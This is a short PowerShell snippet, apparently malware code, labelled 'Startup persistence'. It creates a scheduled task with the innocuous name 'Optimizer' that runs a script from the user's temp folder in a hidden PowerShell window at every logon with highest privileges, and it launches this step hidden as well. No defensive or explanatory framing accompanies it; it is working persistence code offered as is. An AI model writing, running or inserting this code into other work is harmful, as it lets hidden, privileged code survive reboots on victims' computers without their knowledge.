# Startup persistence
$schtask = {
    schtasks /create /tn "Optimizer" /tr "powershell -w hidden -f $env:TEMP\run.ps1" /sc onlogon /rl highest /f
}
Start-Process powershell -ArgumentList "-w hidden -c $schtask"